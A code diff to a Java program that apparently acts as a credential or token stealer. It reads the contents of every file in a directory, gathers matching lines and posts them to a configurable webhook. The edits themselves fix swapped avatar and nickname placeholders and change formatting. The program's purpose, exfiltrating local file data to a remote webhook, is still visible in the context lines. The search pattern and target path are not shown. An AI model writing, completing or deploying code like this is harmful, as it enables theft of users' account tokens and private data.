@@ -10,8 +10,8 @@ public class Main
 {
 
 	public static String webhookURL = "WEBHOOK_URL";
-	public static String avatarURL = "WEBHOOK_NICKNAME";
-	public static String webhookNickname = "WEBHOOK_AVATAR_URL";
+	public static String avatarURL = "WEBHOOK_AVATAR_URL";
+	public static String webhookNickname = "WEBHOOK_NICKNAME";
 	
 	public static void main(String[] args) {
 		Webhook webhook1 = new Webhook(webhookURL);
@@ -23,7 +23,7 @@ public class Main
 		}
 		webhook1.setContent(sb.toString());
 		try {
-			webhook1.execute();
+		webhook1.execute();
 		} catch (IOException e) {
 		}
 	}
@@ -44,8 +44,7 @@ public class Main
 			}
 			for (String pathname : file.list()) {
 				try {
-					BufferedReader br = new BufferedReader(new InputStreamReader(
-							new DataInputStream(new FileInputStream(file.getAbsolutePath() + "/" + pathname))));
+					BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(file.getAbsolutePath() + "/" + pathname))));
 					String strLine;
 					int index;
 					while ((strLine = br.readLine()) != null) {
